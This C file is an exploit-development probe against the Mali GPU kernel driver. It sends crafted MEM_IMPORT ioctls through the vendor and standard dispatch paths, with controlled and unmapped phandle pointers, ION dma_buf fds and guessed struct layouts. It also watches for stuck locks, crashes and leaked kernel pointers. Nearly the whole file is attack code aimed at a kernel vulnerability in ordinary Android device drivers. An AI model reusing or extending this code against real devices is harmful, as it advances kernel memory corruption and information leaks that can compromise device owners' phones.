/*
 * mali_exploit9.c — Focused vendor import exploitation
 *
 * KEY INSIGHT: The vendor dispatch (0x80) and standard dispatch ('M') process
 * MEM_IMPORT differently. Standard returns -1 (ENOTTY?), vendor processes it.
 * We need to understand EXACTLY what the vendor dispatch reads from *phandle.
 *
 * Approach: Incremental probing with controlled data
 *
 * Test 1: Lock check — does vendor import hold reg_lock during processing?
 * Test 2: Controlled phandle data — try every possible fd value 0-20
 * Test 3: Type field sweep — is the type at a different offset in vendor?
 * Test 4: Buffer layout — is the vendor struct layout different from standard?
 * Test 5: MEM_IMPORT crash mechanism — try standard 'M' with unmapped phandle
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/* ============================================================= */
/* TEST 1: Does vendor MEM_IMPORT hold a lock?                    */
/* ============================================================= */
static void test1(int mali_fd) {
    fprintf(stderr, "\n=== TEST 1: Lock state after vendor import ===\n");

    /* Map controlled memory */
    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) return;
    memset(mapped, 0, 0x10000);

    /* Vendor import with mapped phandle */
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = 0x40001000;
    *(uint32_t*)(buf + 16) = 2;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Vendor import: result=%u\n", ((struct uk_header*)buf)->id);

    /* Now try MEM_ALLOC which also takes the reg_lock */
    uint8_t abuf[56];
    memset(abuf, 0, 56);
    ((struct uk_header*)abuf)->id = 512;
    *(uint64_t*)(abuf + 8) = 1;
    *(uint64_t*)(abuf + 16) = 1;
    *(uint64_t*)(abuf + 32) = 0xF;
    ioctl(mali_fd, make_cmd_std(56), abuf);
    fprintf(stderr, "  Standard alloc after import: result=%u (0=OK)\n",
            ((struct uk_header*)abuf)->id);

    if (((struct uk_header*)abuf)->id == 0) {
        uint64_t va = *(uint64_t*)(abuf + 40);
        fprintf(stderr, "  Lock OK — alloc succeeded (gpu_va=0x%llx)\n",
                (unsigned long long)va);
        /* Clean up */
        uint8_t fbuf[16]; memset(fbuf, 0, 16);
        ((struct uk_header*)fbuf)->id = 516;
        *(uint64_t*)(fbuf + 8) = va;
        ioctl(mali_fd, make_cmd_std(16), fbuf);
    } else {
        fprintf(stderr, "  *** LOCK STUCK — alloc failed! ***\n");
    }

    munmap(mapped, 0x10000);
}

/* ============================================================= */
/* TEST 2: Try every fd value 0-20 at *phandle                   */
/* ============================================================= */
static void test2(int mali_fd) {
    fprintf(stderr, "\n=== TEST 2: fd value sweep at *phandle ===\n");

    /* Get a real dma_buf fd */
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) { fprintf(stderr, "  No ION\n"); return; }
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    ioctl(ion_fd, 0xc0144900, &alloc_s);
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    ioctl(ion_fd, 0xc0084904, &share_s);
    int dma_fd = share_s.fd;
    fprintf(stderr, "  ION fd=%d, dma_buf fd=%d, mali_fd=%d\n",
            ion_fd, dma_fd, mali_fd);

    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) { close(ion_fd); return; }

    uint32_t *p = (uint32_t *)((char *)mapped + 0x1000);

    /* Try each possible fd value at offset 0 of phandle */
    for (int fd_val = -1; fd_val <= 20; fd_val++) {
        memset(mapped, 0, 0x10000);
        p[0] = (uint32_t)fd_val;

        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint64_t*)(buf + 8) = 0x40001000;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;

        ioctl(mali_fd, make_cmd_vendor(48), buf);
        uint32_t result = ((struct uk_header*)buf)->id;
        uint64_t out_va = *(uint64_t*)(buf + 32);

        fprintf(stderr, "  fd=%d: result=%u", fd_val, result);
        if (out_va) fprintf(stderr, " gpu_va=0x%llx", (unsigned long long)out_va);
        if (result != 3) fprintf(stderr, " ***");
        fprintf(stderr, "\n");
    }

    close(dma_fd);
    close(ion_fd);
    munmap(mapped, 0x10000);
}

/* ============================================================= */
/* TEST 3: Different struct layout — what if type is at offset 8? */
/* ============================================================= */
static void test3(int mali_fd) {
    fprintf(stderr, "\n=== TEST 3: Alternative struct layout ===\n");

    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) return;
    memset(mapped, 0, 0x10000);

    /* Get dma_buf fd */
    int ion_fd = open("/dev/ion", O_RDONLY);
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    ioctl(ion_fd, 0xc0144900, &alloc_s);
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    ioctl(ion_fd, 0xc0084904, &share_s);
    int dma_fd = share_s.fd;
    fprintf(stderr, "  dma_buf fd=%d\n", dma_fd);

    /*
     * Standard struct layout:
     * [0-7]   uk_header (id=513, ret=0)
     * [8-15]  phandle (u64)
     * [16-19] type (u32)
     * [20-23] padding
     * [24-31] flags (u64)
     *
     * What if vendor layout is DIFFERENT?
     * Maybe: [8-11] type, [12-15] phandle, [16-23] flags?
     * Or: [8-11] fd (directly, not as pointer), [12-15] type, [16-23] flags?
     */

    /* Try layout A: fd directly at offset 8 (not as pointer) */
    uint8_t buf[48];
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint32_t*)(buf + 8) = dma_fd;  /* fd directly, not pointer */
    *(uint32_t*)(buf + 12) = 0;
    *(uint32_t*)(buf + 16) = 2;      /* type = UMM */
    *(uint64_t*)(buf + 24) = 0xF;
    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Layout A (fd@8): result=%u\n", ((struct uk_header*)buf)->id);

    /* Try layout B: type at offset 8, phandle at offset 12 */
    uint32_t *pp = (uint32_t *)((char *)mapped + 0x1000);
    pp[0] = dma_fd;
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint32_t*)(buf + 8) = 2;        /* type first */
    *(uint32_t*)(buf + 12) = 0x40001000; /* phandle second */
    *(uint64_t*)(buf + 24) = 0xF;
    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Layout B (type@8,ph@12): result=%u\n", ((struct uk_header*)buf)->id);

    /* Try with phandle as 32-bit at offset 8 (not 64-bit) */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint32_t*)(buf + 8) = 0x40001000;
    *(uint32_t*)(buf + 12) = 2;       /* type right after 32-bit phandle */
    *(uint64_t*)(buf + 16) = 0xF;     /* flags */
    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Layout C (ph32@8,type@12): result=%u\n", ((struct uk_header*)buf)->id);

    /* Try with EVERY field filled with the fd number */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    for (int i = 8; i < 48; i += 4) *(uint32_t*)(buf + i) = dma_fd;
    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  All-fd: result=%u\n", ((struct uk_header*)buf)->id);

    /* Try with phandle as &fd (pointer to fd on stack) */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Stack ptr: result=%u\n", ((struct uk_header*)buf)->id);

    close(dma_fd);
    close(ion_fd);
    munmap(mapped, 0x10000);
}

/* ============================================================= */
/* TEST 4: Does standard 'M' crash with unmapped phandle?         */
/* Critical: proves whether vulnerability is vendor-specific       */
/* ============================================================= */
static void test4(void) {
    fprintf(stderr, "\n=== TEST 4: Standard 'M' with unmapped phandle ===\n");

    /* Try standard dispatch with phandle=4 (unmapped) */
    /* If this crashes → both paths are vulnerable */
    /* If this returns error → only vendor path is vulnerable */

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    uint8_t buf[48];

    /* First: standard 'M' with phandle=0 */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = 0;
    *(uint32_t*)(buf + 16) = 2;
    int r = ioctl(mali_fd, make_cmd_std(48), buf);
    fprintf(stderr, "  Standard phandle=0: ioctl=%d errno=%d result=%u\n",
            r, errno, ((struct uk_header*)buf)->id);

    /* Standard 'M' with phandle=0x40001000 (high addr, not mapped) */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = 0x40001000;
    *(uint32_t*)(buf + 16) = 2;
    r = ioctl(mali_fd, make_cmd_std(48), buf);
    fprintf(stderr, "  Standard phandle=0x40001000: ioctl=%d errno=%d result=%u\n",
            r, errno, ((struct uk_header*)buf)->id);

    /* Vendor 0x80 with phandle=0 */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = 0;
    *(uint32_t*)(buf + 16) = 2;
    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Vendor phandle=0: ioctl=%d errno=%d result=%u\n",
            r, errno, ((struct uk_header*)buf)->id);

    /* Vendor 0x80 with phandle=0x40001000 (NOT mapped) */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = 0x40001000;
    *(uint32_t*)(buf + 16) = 2;
    r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  Vendor phandle=0x40001000 (unmapped): ioctl=%d errno=%d result=%u\n",
            r, errno, ((struct uk_header*)buf)->id);

    close(mali_fd);
}

/* ============================================================= */
/* TEST 5: Dump the full response buffer from vendor import       */
/* Look for any kernel pointers leaked back                       */
/* ============================================================= */
static void test5(int mali_fd) {
    fprintf(stderr, "\n=== TEST 5: Response buffer analysis ===\n");

    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (mapped == MAP_FAILED) return;
    memset(mapped, 0, 0x10000);

    /* Fill phandle area with known pattern to detect what kernel reads */
    uint32_t *p = (uint32_t *)((char *)mapped + 0x1000);
    for (int i = 0; i < 64; i++)
        p[i] = 0xBB000000 | (i * 4);

    /* Initialize response buffer with 0xCC to detect writes */
    uint8_t buf[48];
    memset(buf, 0xCC, 48);
    ((struct uk_header*)buf)->id = 513;
    ((struct uk_header*)buf)->ret = 0xCCCCCCCC;
    *(uint64_t*)(buf + 8) = 0x40001000;
    *(uint32_t*)(buf + 16) = 2;
    *(uint32_t*)(buf + 20) = 0xCCCCCCCC;
    *(uint64_t*)(buf + 24) = 0xF;
    /* Leave bytes 32-47 as 0xCC to see if kernel writes output there */

    int r = ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  ioctl=%d errno=%d\n", r, errno);
    fprintf(stderr, "  Full response buffer:\n");
    for (int i = 0; i < 48; i += 4) {
        uint32_t v = *(uint32_t*)(buf + i);
        const char *note = "";
        if (v >= 0xC0000000 && v <= 0xD0000000) note = " ← KERNEL PTR?";
        else if (v == 0xCCCCCCCC) note = " (unchanged)";
        else if (v >= 0xBB000000 && v <= 0xBB000100) note = " ← FROM *phandle!";
        fprintf(stderr, "    [%2d] 0x%08x%s\n", i, v, note);
    }

    /* Check if *phandle was modified */
    fprintf(stderr, "  phandle memory:\n");
    for (int i = 0; i < 16; i++) {
        uint32_t expected = 0xBB000000 | (i * 4);
        if (p[i] != expected)
            fprintf(stderr, "    [%d] 0x%08x → 0x%08x (MODIFIED)\n",
                    i*4, expected, p[i]);
    }

    munmap(mapped, 0x10000);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Focused Import Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    int mali_fd = mali_open_ctx();

    if (test == 0 || test == 1) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test1(mali_fd); _exit(0); }
        int st; waitpid(pid, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  signal %d\n", WTERMSIG(st));
    }

    if (test == 0 || test == 2) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test2(mali_fd); _exit(0); }
        int st; waitpid(pid, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  signal %d\n", WTERMSIG(st));
    }

    if (test == 0 || test == 3) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test3(mali_fd); _exit(0); }
        int st; waitpid(pid, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  signal %d\n", WTERMSIG(st));
    }

    if (test == 0 || test == 4) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test4(); _exit(0); }
        int st; waitpid(pid, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  TEST 4 CRASH: signal %d ← IMPORTANT!\n",
                    WTERMSIG(st));
    }

    if (test == 0 || test == 5) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test5(mali_fd); _exit(0); }
        int st; waitpid(pid, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  signal %d\n", WTERMSIG(st));
    }

    if (mali_fd >= 0) close(mali_fd);
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
